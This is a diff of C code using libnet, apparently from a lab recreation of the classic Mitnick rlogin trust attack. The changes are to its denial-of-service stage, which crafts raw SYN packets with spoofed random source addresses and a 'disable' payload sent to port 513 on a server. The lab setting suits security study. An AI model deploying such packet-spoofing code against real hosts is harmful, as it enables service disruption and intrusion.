@@ -11,8 +11,8 @@
 #define XTERMINAL_MAC "02:00:ac:10:10:04"
 
 //ip level data
-#define KEVIN_IP "172.16.16.2"
-#define SERVER_IP "172.16.16.3"
+char * KEVIN_IP = "172.16.16.2";
+char * SERVER_IP = "172.16.16.3";
 #define XTERMINAL_IP "172.16.16.4"
 
 //tcp level data
@@ -37,6 +37,7 @@ int main (void)
 		exit(EXIT_FAILURE);
 	}
 
+	libnet_seed_prand(l);
 	//start DOS part
 	//ip conversion
 	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
@@ -60,7 +61,7 @@ int main (void)
 	for (i = 0; i < 10; i++)
 	{
 		//craft and send 10 packets with "disable" payload
-		send_syn(PORT, (uint8_t *) disable, 8, l, server_ip);
+		send_syn(513, (uint8_t *) disable, 8, l, server_ip);
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
 
@@ -88,11 +89,11 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		libnet_get_prand(LIBNET_PRu16), //sp source port
 		dest_port,											//dp destinatin port
 		libnet_get_prand(LIBNET_PRu32), //sequence number
-    libnet_get_prand(LIBNET_PRu32), //ack number, can I send whatever?
+    0, 															//ack number, can I send whatever?
     TH_SYN,													//control bit SYN
 		libnet_get_prand(LIBNET_PRu16), //window size, random is ok?
 		0,															//checksum, if 0 libnet autofills
-		0,															//urgent pointer ???
+		0,															//urgent pointer
 		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
 		payload,												//payload
 		payload_s,											//payload size
@@ -110,12 +111,12 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 	t = libnet_build_ipv4(
 		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
 		0,																				//tos, type of service
-		libnet_get_prand(LIBNET_PRu16),						//id, ip identification
+		0,																				//id, ip identification
 		0,																				//fragmentation bits and offset
 		libnet_get_prand(LIBNET_PR8),							//ttl
     IPPROTO_TCP,															//upper protocol
     0,																				//checksum, 0 to autofill
-    libnet_get_prand(LIBNET_PRu32),	//src, I use a random fake ip
+    libnet_get_prand(LIBNET_PRu32),						//src, I use a random fake ip
     server_ip,																//destination
     NULL,																			//payload
     0,																				//payload len
@@ -137,5 +138,6 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		exit(EXIT_FAILURE);
 	}
 
+	libnet_clear_packet(l);
 	return 1;
 }
